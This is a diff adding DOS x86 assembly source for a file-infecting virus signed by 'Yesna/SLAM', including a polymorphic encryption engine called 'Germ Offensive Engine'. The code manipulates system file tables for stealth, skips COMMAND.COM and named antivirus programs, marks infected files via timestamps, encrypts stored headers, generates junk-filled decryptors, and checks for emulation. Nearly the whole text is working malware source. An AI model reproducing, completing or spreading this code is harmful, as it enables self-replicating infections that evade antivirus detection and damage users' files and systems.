+;******************************************************************************
+;*                 Diz routine will get the SFT of a file                     *
+;******************************************************************************
+Get_SFT:
+  Push Bx                                          ;Save File handler on stack
+
+  Mov Ax, 1220h                                    ;Get JFT of file
+  Int 2Fh
+  Jc SFT_Error                                     ;If error then exit
+
+  Xor Bx, Bx
+  Mov Bl, Es:[Di]                                  ;BL = System file entry
+
+  Cmp Bl, 0FFh                                     ;If BL = 0FFh the no SFT
+  Je SFT_Error
+
+  Mov Ax, 1216h                                    ;Get SFT of file
+  Int 2Fh                                          ;ES:[DI] = SFT of file
+  Jc SFT_Error                                     ;Error?
+
+  Pop Bx                                           ;Restore file handler
+  Clc                                              ;Clear carry flag
+  Ret
+
+SFT_Error:
+  Pop Bx                                           ;Restore file handler
+  Stc                                              ;Set carry flag..error
+  Ret
+
+;******************************************************************************
+;*              These routines will pop and push flags and regs               *
+;******************************************************************************
+
+Pop_All:
+  Pop Word Ptr Cs:[Ret_Off]
+  Pop Bp Di Si Es Ds Dx Cx Bx Ax
+  Popf                                             ;Restore flags and regs
+  Push Word Ptr Cs:[Ret_Off]
+  Ret
+
+Push_All:
+  Pop Word Ptr Cs:[Ret_Off]
+  Pushf                                            ;Save flags and regs
+  Push Ax Bx Cx Dx Ds Es Si Di Bp
+  Push Word Ptr Cs:[Ret_Off]
+  Ret
+
+;******************************************************************************
+;*               These routines will goto EOF or SOF using SFT                *
+;******************************************************************************
+
+Seek_End:
+  Call Get_SFT                                     ;Get SFT of file
+  Mov Ax, Word Ptr Es:[Di+11h]                     ;AX = Low word of file size
+  Mov Word Ptr Es:[Di+15h], Ax                     ;Offset in file = AX 
+  Mov Dx, Word Ptr Es:[Di+13h]                     ;DX= High word of file size
+  Mov Word Ptr Es:[Di+17h], Dx                     ;Segment in file = DX
+  Ret                                              ;Goto EOF
+
+Seek_Start:
+  Call Get_SFT
+  Mov Word Ptr Es:[Di+15h], 0                      ;Offset in file = 0
+  Mov Word Ptr Es:[Di+17h], 0                      ;Segment in file = 0
+  Ret                                              ;Goto SOF
+
+;******************************************************************************
+;*          Checks file for being COMMAND.COM and for being an AV             *
+;******************************************************************************
+
+Check_Exe_Com:
+  Call Get_SFT                                     ;Get SFT of file
+  Jc Check_Error                                   ;Error?
+
+  Cmp Word Ptr Es:[Di+28h], 'XE'                   ;Is it an EXE file?
+  Je Check_File                                    ;Yes, then check the file
+
+Check_COM:
+  Cmp Word Ptr Es:[Di+28h], 'OC'                   ;Is it an COM file
+  Jne Check_Error                                  ;No, then exit, not for us
+
+Check_File:
+  Call Get_SFT                                     ;Get SFT of file
+  Jc Check_Error                                   ;Error?
+
+  Push Bx                                          ;Save file handle
+  Xor Si, Si
+  Xor Bx, Bx
+  Xor Cx, Cx
+
+New_Name:
+  Push Di
+  Mov Cl, Byte Ptr Cs:[Avoid+Si]                   ;Compare dat many bytes
+  Add Bx, Cx
+
+Check_More:
+  Mov Al, Byte Ptr Cs:[Avoid+Si+1]                 ;Starting byte to compare..
+
+  Cmp Al, Byte Ptr Es:[20h+Di]                     ;File name from SFT
+  Jne No_Alert
+
+  Inc Si
+  Inc Di
+  Dec Cl
+  Jnz Check_More                                   ;Alert?
+
+  Pop Di Bx                                        ;Restore DI and file point
+
+Check_Error:
+  Stc                                              ;Argh - Dont infect...
+  Ret
+
+No_Alert:
+  Pop Di
+  Inc Bx
+  Mov Si, Bx                                       ;Yeah...proggy to check for
+  Cmp Bx, 38
+  Jae File_OK                                      ;Have we checked for all?
+
+  Jmp New_Name                                     ;Nope...
+
+File_OK:
+  Pop Bx
+  Clc
+  Ret                                              ;File was OK...proceed
+
+;******************************************************************************
+;*              Crypts Original File Header - For Stealth Use                 *
+;******************************************************************************
+
+Crypt_Header:
+  Push Cs
+  Pop Es
+
+  Lea Di, Ds:[Old_Buffer]                          ;Points to decrypted buffer
+  Lea Si, Ds:[Old_Buffer]                          ;Points to encrypted buffer
+  Mov Cx, 1Ch                                      ;Decrypt/encrypt 1Ch bytes
+
+Do_Cryption:
+  LodSb                                            ;Get DS:SI into AX
+  Xor Al, Byte Ptr Ds:[Old_Buffer+1Ch]             ;Crypt file header
+  StoSb                                            ;Store AX at ES:DI
+
+  Loop Do_Cryption                                 ;Loop CX times
+
+  Ret
+
+;******************************************************************************
+;*               Routine which check a file for being infected                *
+;******************************************************************************
+
+Check_It:
+  Mov Al, Byte Ptr Es:[Di+0Dh]                     ;AL = SFT date/time stamp
+  And Al, 1Fh
+
+  Cmp Al, 8 / 2
+  Jne No                                           ;Is it infected?
+
+  Stc                                              ;Set carry flag..infected
+  Ret
+
+No:
+  Clc                                              ;Clear caryy flag
+  Ret                                              ;Not infected
+
+;******************************************************************************
+;*                  Calls To Original Interrupts (21h)                        *
+;******************************************************************************
+
+Int21:
+  Pushf                                            ;Push flags on stack
+  Call Dword Ptr Cs:[OldInt21]                     ;Call original Int 21h
+  Ret
+
+Comment *
+=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-
+
+                        GERM OFFENSIVE ENGINE [GOE]
+                        ---------------------------
+                                 By Yesna
+
+                             (My First Engine)
+
+Note:
+-----
+   Garbage Instructions consist of several:
+          JMP IMM16
+
+   Capable of generating following countregs:
+          MOV REG16, IMM16 (Regs = BX, SI, DI, BP)
+
+   Uses following encryption/decryption methods:
+          XOR/SUB/ADD
+
+   As incrementors its able to use:
+          INC/ADD
+
+  Diz engine has many limitations and its therefore only slightly polymorphic.
+   
+
+Input:
+------
+   DS:SI = Start of virus code
+   ES:DI = W
+      CX = Virus size
+      AX = Decryptor offset
+
+Output:
+-------
+   CX = New size (Encrypted data + decryptor)
+   BP = Size of Decryptor Routine
+
+Max. Decryptor = 5031 bytes.
+
+=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-
+*
+
+GOE:
+  Push Ds
+  
+  Push Cs
+  Pop Ds
+
+  Push Si                                          ;Save start of code
+  Mov Word Ptr Ds:[Dest], Di                       ;Save where to put code
+  Mov Word Ptr Ds:[Old_Size], Cx                   ;Save code size
+
+Get_IndexReg:
+  Mov Ax, 4                                        ;Get a random number
+  Call Rnd_Int
+
+  Xchg Ax, Bx
+
+  Lea Si, Ds:[Index_Regs[Bx]]
+  LodsB                                            ;Save index reg / reg16
+  Mov Byte Ptr Ds:[IndexReg], Al
+
+  Lea Si, Ds:[Index_Regs_Mem[Bx]]                  ;Save index reg / mod
+  LodsB
+  Push Ax
+
+  Call Make_Garbage                                ;Make some garbage
+
+Setup_IndexReg:  
+  Mov Al, Byte Ptr Ds:[IndexReg]
+  Or Al, 10111000b                                 ;Make a mov reg16, imm
+  StosB
+  Pop Ax
+  Push Di Ax Ax
+  StosW
+
+  Call Make_Garbage                                ;Some more garbage
+
+Get_Enc_Mode:
+  Mov Ax, 3
+  Call Rnd_Int
+
+  Xchg Ax, Bx
+
+  Lea Si, Ds:[Decrypt_Table[Bx]]
+  LodsB                                            ;Determine which method
+  Mov Byte Ptr Ds:[En_De_Method], Al               ;to use / sub / add / xor
+
+Setup_Decrypt_Meth:
+  Mov Ax, 1000000100101110b                        ;Make sub / add / xor
+  StosW
+
+  Pop Ax
+
+  Or Al, Byte Ptr Ds:[En_De_Method]
+  StosB
+
+  Mov Byte Ptr Ds:[En_De_Method], Bl               ;Add mod reg
+
+  Pop Ax
+
+  Cmp Al, 01000110b                                ;If index reg = BP then
+  Jne Data
+
+  Xor Ax, Ax                                       ;make an extra byte...
+  StosB
+
+Data:
+  Mov Word Ptr Ds:[Crypt_Value_Off], Di            ;Store crypt value
+  StosW
+
+  Call Make_Garbage                                ;Make a bit of garbage
+
+Make_Increment:
+  Mov Ax, 2
+  Call Rnd_Int
+
+  Xchg Ax, Bx
+
+  Cmp Bx, 1
+  Je Make_Add
+
+  Mov Al, Byte Ptr Ds:[IndexReg]
+  Or Al, 01000000b                                 ;Make two inc reg16
+  StosB
+
+  Mov Al, Byte Ptr Ds:[IndexReg]
+  Or Al, 01000000b
+  StosB
+
+  Jmp Inc_Ok
+
+Make_Add:
+  Mov Al, 10000001b
+  StosB
+
+  Mov Al, 11000000b
+  Or Al, Byte Ptr Ds:[IndexReg]                    ;Make add reg16, 2
+  StosB
+
+  Mov Ax, 2
+  StosW
+
+Inc_OK:
+  Call Make_Garbage                                ;Then we need some junk
+
+Make_Cmp:
+  Mov Al, 10000001b                                ;Make cmp reg16, imm
+  StosB
+
+  Db 0B0h                                          ;Reg contains offset
+  IndexReg Db 0                                    ;where to decrypt
+  Or Al, 11111000b
+  StosB
+
+  Push Di
+  Stosw
+
+  Call Make_Garbage                                ;A bit of garbage
+
+Make_Jae:
+  Mov Al, 01110011b
+  StosB
+
+  Mov Al, 00000011b                                ;Make a jae
+  StosB  
+  
+Make_Loop_Jump:
+  Mov Al, 11101001b
+  StosB
+
+  Mov Ax, Word Ptr Ds:[Crypt_Value_Off]
+  Sub Ax, Di
+  Sub Ax, 5
+  Cmp Byte Ptr Ds:[IndexReg], 00000101b            ;Make jump16 loop
+  Jne Not_BP
+  Dec Ax
+  
+Not_BP:
+  StosW
+
+Make_Offsets:
+  Mov Bx, Di
+
+  Mov Ax, Word Ptr Ds:[Old_Size]
+  Sub Ax, Di
+  Neg Ax
+  Add Ax, Bp                                       ;Determine how much code
+  Add Ax, Word Ptr Ds:[Old_Size]                   ;to decrypt
+  Pop Di
+  StosW
+
+  Mov Ax, Bx
+Dest Equ Word Ptr $+1
+  Sub Ax, 00h                                      ;Offset of code to 
+  Add Ax, Bp                                       ;decrypt
+  Pop Di
+  StosW
+
+  Call Random
+  Db 0BFh
+  Crypt_Value_Off Dw 0
+  StosW                                            ;Make random crypt value
+  Mov Word Ptr Ds:[Encrypt_Key], Ax
+
+  Xchg Bx, Di
+
+Setup_Encryptor:
+  Pop Si
+  Db 0B9h
+  Old_Size Dw 0                                    ;Size to encrypt
+  Push Cx Di
+  Inc Cx
+  Shr Cx, 1
+ 
+  Xor Bx, Bx
+  Db 0B3h                                          ;Store encryption
+  En_De_Method Db 0
+  Mov Al, Byte Ptr Ds:[Encrypt_Table[Bx]]          ;method
+  Mov Byte Ptr Ds:[Encrypt_Algo], Al               ;xor / sub / add
+
+  Cld
+
+Encrypt:
+  LodsW
+Encrypt_Algo Equ Byte Ptr $
+Encrypt_Key Equ Word Ptr $+1                       ;Encrypt code...
+  Mov Ax, 00h
+
+  StosW
+
+  Loop Encrypt
+
+Return_Regs:
+  Pop Ax
+  Pop Cx
+  Add Cx, Ax                                       ;CX = New size
+
+  Sub Ax, Word Ptr Ds:[Dest]
+
+  Xchg Ax, Bp                                      ;BP = Decryptor size
+
+  Pop Ds
+    
+  Ret                                              ;Return to caller
+  
+Make_Jump:
+  Call Rnd_Int
+  Add Ax, 500
+  Push Ax
+
+  Mov Al, 11101001b                                ;Make jump16
+  StosB
+
+  Pop Ax
+  StosW
+
+  Ret
+
+Make_Garbage:
+  Mov Ax, 500
+  Call Make_Jump                                   ;Garbage routine
+
+  Xchg Ax, Bx
+
+Write_Garbage:
+  Mov Ax, 255
+  Call Rnd_Int
+
+  StosB
+
+  Dec Bx                                           ;Make garbage
+
+  Cmp Bx, 0
+  Jne Write_Garbage
+
+  Ret  
+  
+Random:
+  In Al, 40h
+  Mov Ah, Al
+  In Al, 40h                                       ;Get random word...
+
+  Mov Word Ptr Ds:[Seed], Ax
+
+  Ret
+
+Rnd_Int:
+  Push Ax
+  Db 0B8h
+  Seed Dw ?
+  Mov Cx, 31413d
+  Mul Cx
+  Add Ax, 13849d                                   ;Get random number within
+  Mov Word Ptr Ds:[Seed], Ax                       ;specified interval
+  Pop Cx
+  Mul Cx
+  Xchg Dx, Ax
+
+  Ret
+
+Index_Regs:
+  Db 00000011b ;BX
+  Db 00000101b ;BP                                 ;Usable index regs
+  Db 00000110b ;SI
+  Db 00000111b ;DI
+
+Index_Regs_Mem:     
+  Db 00000111b ;BX
+  Db 01000110b ;BP                                 ;Usable mod regs
+  Db 00000100b ;SI
+  Db 00000101b ;DI
+
+Decrypt_Table: 
+  Db 00110000b ;XOR
+  Db 00000000b ;ADD                                ;Usable decryptor methods
+  Db 00101000b ;SUB
+
+Encrypt_Table:
+  Db 00110101b ;XOR
+  Db 00101101b ;SUB                                ;Usable encryptor methods
+  Db 00000101b ;ADD
+
+Inc_Table:
+  Db 01000000b ;INC                                ;Usable incrementors
+  Db 11000000b ;ADD
+
+GOE_End:
+
+;******************************************************************************
+;*                               Data Area...                                 *
+;******************************************************************************
+
+Ret_Off Dw 0                                       ;Return code
+OldInt21 Dd 0                                      ;Original Int 21h
+Avoid:                                             ;Let's avoid these files..
+  Db 7, 'COMMAND'
+  Db 6, 'F-PROT'
+  Db 6, 'TBSCAN'
+  Db 5, 'DRWEB'
+  Db 4, 'SCAN'
+  Db 3, 'NOD'                                      ;NOD-ICE = The BEST AV prog.
+  Db 3, 'AVP'
+Name_Author_ Db ' [Loke] By Yesna/SLAM'            ;Guess what....it's meee...
+Buffer Db 1Ch Dup(?)                               ;File header
+
+Decrypt:
+  Pop Si                                           ;SI = Delta offset
+  Push Si                                          ;Save SI for RET instruction
+
+  In Al, 40h                                       ;Get word from CPU clock
+  Inc Ax                                           ;Increment AX with 1
+  Xchg Ax, Bx                                      ;BX = AX and AX = BX ;)
+
+Emu_Check:
+  In Al, 40h                                       ;Get word from CPU clock
+
+  Cmp Al, Bl                                       ;Are BL and AL even?
+  Jne Emu_Check                                    ;If not, emulation...kill it
+
+  Xor Ax, Ax                                       ;AL = 0
+  Int 15h                                          ;Turn on Cassette motor
+
+  Cmp Ah, 86h                                      ;If not error msg 86h
+  Jne Emu                                          ;Then we r being emulated
+
+  Mov Cx, (Decrypt-Eff_Jump-3)                     ;CX = Number to decrypt
+
+Second_Layer:
+Crypt_Value Equ Byte Ptr $+1                       ;Variable of decpryt key
+  Mov Al, 00h                                      ;AL = Decrypt key
+
+Encrypt_Second:
+  Xor Byte Ptr Cs:[Si], Al                         ;Use simple XOR cryption
+  Inc Si                                           ;SI = Next byte to crypt
+
+  Loop Encrypt_Second                              ;Loop CX times
+
+Emu:
+  Ret
+
+Viruz_Code:
+
+Old_Buffer Db 1Dh Dup(?)                           ;Original file header
+                                                   ;will be encrypted seperatly
+Viruz_End:
+
+End Eff_Jump
+
